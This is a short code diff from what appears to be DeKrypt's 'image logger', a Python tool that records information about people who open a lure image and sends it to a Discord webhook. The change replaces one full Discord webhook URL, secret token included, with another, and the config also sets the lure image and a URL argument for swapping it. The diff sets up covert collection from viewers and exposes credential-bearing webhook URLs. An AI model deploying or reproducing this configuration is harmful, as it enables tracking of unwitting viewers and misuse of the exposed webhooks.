@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discordapp.com/api/webhooks/1361000529945432076/k-c7ogly5_BD1ntZeHPieKDBxvOQNG301_cbp3gnrhfM_nJ8GmsyWrcjlchdIwJOn3f1",
+    "webhook": "https://discord.com/api/webhooks/1434560713405497376/Iq63jUpJzKUYDYMh1oVFXjjGeMKCrNPxbVTHGzx8684qKpOnSSVmbctf4gMhbAGVDWWl",
     "image": "https://www.clamart.fr/sites/default/files/ACTUALITE/2021/02%20-%20FEVRIER/morpion%20%C3%A0%20imprimer%20-%20ludotheque.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
